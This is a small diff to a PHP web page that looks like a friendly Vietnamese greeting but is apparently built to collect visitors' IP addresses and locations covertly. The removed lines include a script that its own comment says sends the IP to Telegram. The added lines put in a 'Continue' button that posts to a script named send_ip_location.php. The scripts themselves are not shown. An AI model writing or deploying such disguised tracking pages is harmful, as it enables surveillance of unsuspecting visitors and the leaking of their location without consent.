@@ -8,9 +8,11 @@
 <body>
     <h1>Xin Chào, Ngày Mới Tốt Lành!</h1>
     <p>Chúc bạn một ngày tuyệt vời!</p>
-    <!-- Gọi tới script PHP để lấy địa chỉ IP và gửi về Telegram -->
-    <?php
-    include('send_ip.php');
-    ?>
+
+    <!-- Nút tiếp tục để lấy IP -->
+    <form method="POST" action="send_ip_location.php">
+        <button type="submit" name="continue" value="1">Tiếp tục</button>
+    </form>
+
 </body>
 </html>
